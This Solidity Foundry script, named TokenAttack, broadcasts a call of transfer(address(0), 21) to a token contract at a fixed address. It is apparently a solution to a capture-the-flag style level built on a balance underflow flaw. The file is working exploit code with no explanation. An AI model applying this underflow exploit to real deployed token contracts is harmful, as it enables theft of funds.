// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../contracts/interfaces/IToken.sol";
import "forge-std/Script.sol";

contract TokenAttack is Script {
    IToken public targetContract = IToken(payable(0x67F00ABE0F70cC11554CD51a5D4005E3b2a158D1));

    function run() public {
        vm.startBroadcast();
        // uint256 startBal = targetContract.balanceOf(msg.sender);
        // console.log(startBal);
        targetContract.transfer(address(0), 21);
        // uint256 endBal = targetContract.balanceOf(msg.sender);
        // console.log(endBal);
        vm.stopBroadcast();
    }
}
